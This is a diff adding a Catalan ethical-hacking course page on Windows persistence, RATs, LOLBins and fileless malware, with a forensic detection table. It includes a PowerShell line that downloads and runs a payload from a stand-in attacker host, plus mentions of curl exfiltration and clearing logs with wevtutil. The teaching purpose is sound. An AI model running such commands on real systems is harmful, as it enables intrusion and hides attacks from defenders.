@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="ca">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>M05 U4·M3 – Persistències i Portes del Darrere</title>
+    <meta name="description"
+        content="Teoria sobre Persistències, Portes del Darrere i LOLBins en Windows - M05 Seguretat Informàtica">
+
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&family=Fira+Code:wght@400;500&display=swap"
+        rel="stylesheet">
+
+    <!-- CSS link -->
+    <link rel="stylesheet" href="css/teoriaM05.css">
+
+    <!-- Lucide Icons -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+</head>
+
+<body>
+    <div class="stars-container" id="stars"></div>
+
+    <header>
+        <nav class="navbar">
+            <a href="index.html" class="logo">
+                <span class="logo-at">Hacking Etic</span>
+            </a>
+            <ul class="nav-links">
+                <li><a href="#concepte">Concepte</a></li>
+                <li><a href="#tecniques">Tècniques</a></li>
+                <li><a href="#rat">RATs</a></li>
+                <li><a href="#lolbins">LOLBins</a></li>
+                <li><a href="#resum" class="nav-connect">Resum</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main>
+        <!-- Hero Section -->
+        <section class="hero" id="home">
+            <div class="hero-content">
+                <div class="badge">M05: Seguretat Informàtica · Unitat 4</div>
+                <h1 class="hero-title">
+                    Persistències i Backdoors<br>
+                    <span class="accent-text">The Eternal Ghost</span>
+                </h1>
+                <p class="hero-subtitle">Garantint el manteniment de l'accés en sistemes compromesos</p>
+                <div class="scroll-indicator">
+                    <i data-lucide="chevron-down"></i>
+                </div>
+            </div>
+        </section>
+
+        <div class="main-container">
+
+            <!-- Section 3 Intro -->
+            <section id="concepte" class="content-section">
+                <div class="glass-card">
+                    <div class="page-tag" style="color: var(--accent-purple); font-weight: 700; margin-bottom: 1rem;">
+                        TEORIA · MANTENIMENT DE L'ACCÉS</div>
+                    <h2>SECCIÓ 3: Persistències i Portes del Darrere</h2>
+                    <p>Un cop compromès el sistema, l'atacant ha d'assegurar-se que no perdrà l'accés si l'usuari
+                        reinicia l'ordinador, tanca la sessió o canvia la contrasenya. Aquest conjunt de tècniques
+                        s'anomena <strong>Persistència</strong>.</p>
+
+                    <div class="image-placeholder">
+                        <a href="https://attack.mitre.org/tactics/TA0003/" target="_blank" rel="noopener"
+                            class="img-link-wrapper" aria-label="Obrir MITRE ATT&CK sobre Persistència">
+                            <div class="img-placeholder-inner">
+                                <img src="images/teoriaM03/rce-exploit.png" alt="Concepte de Persistència"
+                                    class="theory-img">
+                                <div class="img-placeholder-label">
+                                    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                        stroke-width="1.5">
+                                        <rect x="3" y="3" width="18" height="18" rx="2"></rect>
+                                        <circle cx="8.5" cy="8.5" r="1.5"></circle>
+                                        <polyline points="21 15 16 10 5 21"></polyline>
+                                    </svg>
+                                    <span>Tàctica: Manteniment de l'accés</span>
+                                    <small>images/teoriaM03/rce-exploit.png</small>
+                                </div>
+                            </div>
+                            <div class="img-link-bar">
+                                <i data-lucide="external-link" style="width: 15px;"></i>
+                                <span>Explorar tàctiques: MITRE ATT&CK - Persistence</span>
+                            </div>
+                        </a>
+                    </div>
+
+                    <h3>🔑 El concepte de Persistència</h3>
+                    <p>Mantenir el control requereix mecanismes que s'auto-executin. L'objectiu és trobar un equilibri
+                        entre la <strong>visibilitat</strong> (ser fàcil de detectar per un administrador) i la
+                        <strong>robustesa</strong> (resistir a neteges del sistema).</p>
+                </div>
+            </section>
+
+            <!-- Section 3.1: Techniques -->
+            <section id="tecniques" class="content-section">
+                <div class="glass-card">
+                    <h2>3.1 Tècniques de Persistència Tradicionals</h2>
+                    <p>Es basen a utilitzar funcionalitats legítimes de Windows per carregar codi maliciós en
+                        l'arrencada:</p>
+
+                    <div class="theory-grid">
+                        <div class="theory-card">
+                            <i data-lucide="folder-plus"></i>
+                            <h3>Carpeta Startup</h3>
+                            <p>Col·locar scripts a <code>\AppData\Roaming\...\Startup</code>. Senzill però fàcil de
+                                detectar.</p>
+                        </div>
+                        <div class="theory-card">
+                            <i data-lucide="edit-3"></i>
+                            <h3>Registre Autorun</h3>
+                            <p>Claus <code>Run</code> a <code>HKCU</code> o <code>HKLM</code> que executen programes al
+                                iniciar sessió.</p>
+                        </div>
+                        <div class="theory-card">
+                            <i data-lucide="server"></i>
+                            <h3>Serveis de Windows</h3>
+                            <p>Crear serveis (<code>sc create</code>) amb inici automàtic per rebre shells com a SYSTEM.
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Section 3.2: RAT -->
+            <section id="rat" class="content-section">
+                <div class="glass-card">
+                    <h2>👻 3.2 Portes del Darrere: RAT (Remote Access Trojans)</h2>
+                    <p>Un <strong>RAT</strong> és un programari maliciós que permet el control remot total d'un sistema.
+                    </p>
+
+                    <div class="info-box">
+                        <h3>RAT vs. RAT: Eines legítimes vs Malicioses</h3>
+                        <p>La diferència entre una eina d'administració (PsExec, TeamViewer) i un troià (NjRAT,
+                            RemcosRAT) és la <strong>intenció</strong> i el <strong>consentiment</strong>.</p>
+                        <p style="margin-top: 1rem;"><strong>Funcionalitats:</strong> Keyloggers, captura de pantalla,
+                            control de càmera i el famós <em>Watchdog</em> (procés que reinicia l'implant si es tanca).
+                        </p>
+                    </div>
+
+                    <div class="image-placeholder">
+                        <a href="https://www.mandiant.com/resources/blog/remote-access-trojans" target="_blank"
+                            rel="noopener" class="img-link-wrapper" aria-label="Llegir sobre RATs a Mandiant">
+                            <div class="img-placeholder-inner">
+                                <img src="images/teoriam05/passwords_search.png" alt="Anàlisi de RAT"
+                                    class="theory-img">
+                                <div class="img-placeholder-label">
+                                    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                        stroke-width="1.5">
+                                        <rect x="3" y="3" width="18" height="18" rx="2"></rect>
+                                        <circle cx="8.5" cy="8.5" r="1.5"></circle>
+                                        <polyline points="21 15 16 10 5 21"></polyline>
+                                    </svg>
+                                    <span>Anàlisi: Comportament d'un RAT modern</span>
+                                    <small>images/teoriam05/passwords_search.png</small>
+                                </div>
+                            </div>
+                            <div class="img-link-bar">
+                                <i data-lucide="shield" style="width: 15px;"></i>
+                                <span>Article: Evolució dels RATs — Mandiant</span>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Section 3.3: LOLBins -->
+            <section id="lolbins" class="content-section">
+                <div class="glass-card">
+                    <h2>🚀 3.3 LOLBins i Atacs Fileless (Malware sense fitxers)</h2>
+                    <p>Per evitar els antivirus que busquen fitxers <code>.exe</code>, s'utilitzen
+                        <strong>LOLBins</strong> (Living Off the Land Binaries): eines legítimes del propi sistema.</p>
+
+                    <div class="theory-grid" style="grid-template-columns: 1fr;">
+                        <div class="info-box">
+                            <h3><i data-lucide="share-2" style="color: var(--accent-blue);"></i> Exfiltració i Beaconing
+                            </h3>
+                            <p><strong>curl:</strong> Utilitzar la comanda nativa per enviar dades sensibles capturades
+                                cap a l'exterior.</p>
+                            <p><strong>Beaconing (C2):</strong> Tasques programades (<code>schtasks</code>) que "truquen
+                                a casa" per rebre ordres, imitant el trànsit web normal.</p>
+                        </div>
+                        <div class="info-box">
+                            <h3><i data-lucide="zap" style="color: var(--accent-gold);"></i> Execució en memòria
+                                (PowerShell)</h3>
+                            <p>Descarregar i executar codi directament a la RAM sense tocar el disc dur:</p>
+                            <code>powershell -Command "IEX(New-Object Net.WebClient).DownloadString('http://kali/payload.ps1')"</code>
+                        </div>
+                    </div>
+
+                    <div class="image-placeholder" style="margin-top: 2rem;">
+                        <a href="https://lolbas-project.github.io/" target="_blank" rel="noopener"
+                            class="img-link-wrapper" aria-label="Obrir projecte LOLBAS">
+                            <div class="img-placeholder-inner">
+                                <div class="img-placeholder-label">
+                                    <i data-lucide="binary"
+                                        style="width: 48px; height: 48px; margin-bottom: 1rem; color: var(--accent-blue);"></i>
+                                    <span>Projecte LOLBAS</span>
+                                    <p style="font-size: 0.9rem;">Llista completa de binaris de Windows utilitzables per
+                                        a l'atac.</p>
+                                </div>
+                            </div>
+                            <div class="img-link-bar">
+                                <i data-lucide="globe" style="width: 15px;"></i>
+                                <span>Consultar: lolbas-project.github.io</span>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Section: Forensic -->
+            <section class="content-section">
+                <div class="glass-card">
+                    <h2>⚖️ Anàlisi de Detecció Forense</h2>
+                    <div style="overflow-x: auto; margin-top: 1.5rem;">
+                        <table style="width: 100%; border-collapse: collapse; text-align: left;">
+                            <thead>
+                                <tr style="border-bottom: 1px solid var(--border-color); color: var(--accent-blue);">
+                                    <th style="padding: 1rem;">Mètode</th>
+                                    <th style="padding: 1rem;">Detecció</th>
+                                    <th style="padding: 1rem;">Rastre Forense</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr style="border-bottom: 1px solid var(--border-color);">
+                                    <td style="padding: 1rem;"><strong>Servei (SC)</strong></td>
+                                    <td style="padding: 1rem;"><span class="badge"
+                                            style="background: rgba(239, 68, 68, 0.1); color: var(--accent-red);">Alta</span>
+                                    </td>
+                                    <td style="padding: 1rem;">Clau a <code>HKLM\...\Services</code></td>
+                                </tr>
+                                <tr style="border-bottom: 1px solid var(--border-color);">
+                                    <td style="padding: 1rem;"><strong>Tasca Programada</strong></td>
+                                    <td style="padding: 1rem;"><span class="badge"
+                                            style="background: rgba(234, 179, 8, 0.1); color: var(--accent-gold);">Mitjana</span>
+                                    </td>
+                                    <td style="padding: 1rem;">Artefactes a <code>C:\Windows\System32\Tasks</code></td>
+                                </tr>
+                                <tr style="border-bottom: 1px solid var(--border-color);">
+                                    <td style="padding: 1rem;"><strong>Fileless (RAM)</strong></td>
+                                    <td style="padding: 1rem;"><span class="badge"
+                                            style="background: rgba(34, 197, 94, 0.1); color: #22c55e);">Baixa</span>
+                                    </td>
+                                    <td style="padding: 1rem;"> Logs de PowerShell</td>
+                                </tr>
+                                <tr>
+                                    <td style="padding: 1rem;"><strong>Timestomping</strong></td>
+                                    <td style="padding: 1rem;"><span class="badge"
+                                            style="background: rgba(59, 130, 246, 0.1); color: var(--accent-blue);">Molt
+                                            Baixa</span></td>
+                                    <td style="padding: 1rem;">Falsificació de metadades de temps</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Callout Event ID -->
+            <section class="content-section">
+                <div class="info-callout" style="border-color: var(--accent-red);">
+                    <span class="callout-icon">🚨</span>
+                    <div class="callout-content">
+                        <h4>Info Callout: L'Event 1102 i el Crit del Silenci</h4>
+                        <p>Esborrar els logs amb <code>wevtutil cl Security</code> sembla bona idea, però genera
+                            automàticament l'<strong>Event ID 1102</strong>. Per al Blue Team, aquest esdeveniment és
+                            una alarma vermella: algú està intentant amagar les seves petjades.</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Resum de la Secció 3 -->
+            <section id="resum" class="content-section mb-5">
+                <div class="summary-box">
+                    <h3>🗂️ Resum de la Secció 3</h3>
+                    <div class="summary-items">
+                        <div class="summary-item">
+                            <span class="summary-label">Objectiu</span>
+                            <p>Mantenir l'accés permanent al sistema.</p>
+                        </div>
+                        <div class="summary-item">
+                            <span class="summary-label">Mètodes</span>
+                            <p>Registre Run, Tasques Programades, Serveis i C2.</p>
+                        </div>
+                        <div class="summary-item">
+                            <span class="summary-label">Sigil</span>
+                            <p>Ús de LOLBins (curl, powershell) i Fileless Malware.</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+        </div>
+    </main>
+
+    <script src="js/teoriaM05.js" defer></script>
+</body>
+
+</html>
